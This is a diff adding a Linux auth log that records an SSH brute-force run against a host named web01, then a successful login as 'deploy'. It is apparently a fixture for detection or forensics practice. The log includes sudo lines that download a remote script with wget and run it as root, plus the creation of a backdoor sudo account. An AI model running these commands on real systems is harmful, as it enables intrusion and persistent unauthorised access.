@@ -1,0 +1,57 @@
+Oct 27 01:14:09 web01 sshd[1802]: Accepted publickey for alice from 10.0.0.5 port 40122 ssh2
+Oct 27 01:14:09 web01 sshd[1802]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Oct 27 02:40:55 web01 sshd[1950]: Failed password for bob from 10.0.0.9 port 50311 ssh2
+Oct 27 02:41:07 web01 sshd[1950]: Accepted password for bob from 10.0.0.9 port 50311 ssh2
+Oct 27 03:12:05 web01 sshd[2200]: Failed password for root from 203.0.113.45 port 51000 ssh2
+Oct 27 03:12:09 web01 sshd[2201]: Failed password for invalid user admin from 203.0.113.45 port 51001 ssh2
+Oct 27 03:12:15 web01 sshd[2202]: Failed password for invalid user test from 203.0.113.45 port 51002 ssh2
+Oct 27 03:12:23 web01 sshd[2203]: Failed password for ubuntu from 203.0.113.45 port 51003 ssh2
+Oct 27 03:12:26 web01 sshd[2204]: Failed password for invalid user oracle from 203.0.113.45 port 51004 ssh2
+Oct 27 03:12:29 web01 sshd[2205]: Failed password for git from 203.0.113.45 port 51005 ssh2
+Oct 27 03:12:38 web01 sshd[2206]: Failed password for postgres from 203.0.113.45 port 51006 ssh2
+Oct 27 03:12:45 web01 sshd[2207]: Failed password for deploy from 203.0.113.45 port 51007 ssh2
+Oct 27 03:12:48 web01 sshd[2208]: Failed password for deploy from 203.0.113.45 port 51008 ssh2
+Oct 27 03:12:53 web01 sshd[2209]: Failed password for deploy from 203.0.113.45 port 51009 ssh2
+Oct 27 03:13:00 web01 sshd[2210]: Failed password for root from 203.0.113.45 port 51010 ssh2
+Oct 27 03:13:03 web01 sshd[2211]: Failed password for invalid user admin from 203.0.113.45 port 51011 ssh2
+Oct 27 03:13:10 web01 sshd[2212]: Failed password for invalid user test from 203.0.113.45 port 51012 ssh2
+Oct 27 03:13:14 web01 sshd[2213]: Failed password for ubuntu from 203.0.113.45 port 51013 ssh2
+Oct 27 03:13:17 web01 sshd[2214]: Failed password for invalid user oracle from 203.0.113.45 port 51014 ssh2
+Oct 27 03:13:20 web01 sshd[2215]: Failed password for git from 203.0.113.45 port 51015 ssh2
+Oct 27 03:13:26 web01 sshd[2216]: Failed password for postgres from 203.0.113.45 port 51016 ssh2
+Oct 27 03:13:32 web01 sshd[2217]: Failed password for deploy from 203.0.113.45 port 51017 ssh2
+Oct 27 03:13:35 web01 sshd[2218]: Failed password for deploy from 203.0.113.45 port 51018 ssh2
+Oct 27 03:13:39 web01 sshd[2219]: Failed password for deploy from 203.0.113.45 port 51019 ssh2
+Oct 27 03:13:42 web01 sshd[2220]: Failed password for root from 203.0.113.45 port 51020 ssh2
+Oct 27 03:13:49 web01 sshd[2221]: Failed password for invalid user admin from 203.0.113.45 port 51021 ssh2
+Oct 27 03:13:55 web01 sshd[2222]: Failed password for invalid user test from 203.0.113.45 port 51022 ssh2
+Oct 27 03:13:58 web01 sshd[2223]: Failed password for ubuntu from 203.0.113.45 port 51023 ssh2
+Oct 27 03:14:07 web01 sshd[2224]: Failed password for invalid user oracle from 203.0.113.45 port 51024 ssh2
+Oct 27 03:14:14 web01 sshd[2225]: Failed password for git from 203.0.113.45 port 51025 ssh2
+Oct 27 03:14:17 web01 sshd[2226]: Failed password for postgres from 203.0.113.45 port 51026 ssh2
+Oct 27 03:14:21 web01 sshd[2227]: Failed password for deploy from 203.0.113.45 port 51027 ssh2
+Oct 27 03:14:29 web01 sshd[2228]: Failed password for deploy from 203.0.113.45 port 51028 ssh2
+Oct 27 03:14:37 web01 sshd[2229]: Failed password for deploy from 203.0.113.45 port 51029 ssh2
+Oct 27 03:14:44 web01 sshd[2230]: Failed password for root from 203.0.113.45 port 51030 ssh2
+Oct 27 03:14:47 web01 sshd[2231]: Failed password for invalid user admin from 203.0.113.45 port 51031 ssh2
+Oct 27 03:14:54 web01 sshd[2232]: Failed password for invalid user test from 203.0.113.45 port 51032 ssh2
+Oct 27 03:15:01 web01 sshd[2233]: Failed password for ubuntu from 203.0.113.45 port 51033 ssh2
+Oct 27 03:15:07 web01 sshd[2234]: Failed password for invalid user oracle from 203.0.113.45 port 51034 ssh2
+Oct 27 03:15:10 web01 sshd[2235]: Failed password for git from 203.0.113.45 port 51035 ssh2
+Oct 27 03:15:14 web01 sshd[2236]: Failed password for postgres from 203.0.113.45 port 51036 ssh2
+Oct 27 03:15:17 web01 sshd[2237]: Failed password for deploy from 203.0.113.45 port 51037 ssh2
+Oct 27 03:15:24 web01 sshd[2238]: Failed password for deploy from 203.0.113.45 port 51038 ssh2
+Oct 27 03:15:33 web01 sshd[2239]: Failed password for deploy from 203.0.113.45 port 51039 ssh2
+Oct 27 03:15:37 web01 sshd[2240]: Failed password for root from 203.0.113.45 port 51040 ssh2
+Oct 27 03:15:42 web01 sshd[2241]: Failed password for invalid user admin from 203.0.113.45 port 51041 ssh2
+Oct 27 03:19:42 web01 sshd[2301]: Accepted password for deploy from 203.0.113.45 port 52001 ssh2
+Oct 27 03:19:42 web01 sshd[2301]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Oct 27 03:20:15 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id
+Oct 27 03:21:03 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.77/x.sh -O /tmp/.x.sh
+Oct 27 03:21:30 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash /tmp/.x.sh
+Oct 27 03:22:01 web01 useradd[2388]: new user: name=svc_backup, UID=1005, GID=1005, home=/home/svc_backup, shell=/bin/bash
+Oct 27 03:22:09 web01 usermod[2391]: add 'svc_backup' to group 'sudo'
+Oct 27 03:22:40 web01 sudo: deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/crontab -l -u root
+Oct 27 03:23:02 web01 CRON[2402]: pam_unix(cron:session): session opened for user root by (uid=0)
+Oct 27 03:31:50 web01 sshd[2420]: pam_unix(sshd:session): session closed for user deploy
+Oct 27 08:02:11 web01 sshd[2900]: Accepted publickey for alice from 10.0.0.5 port 41200 ssh2
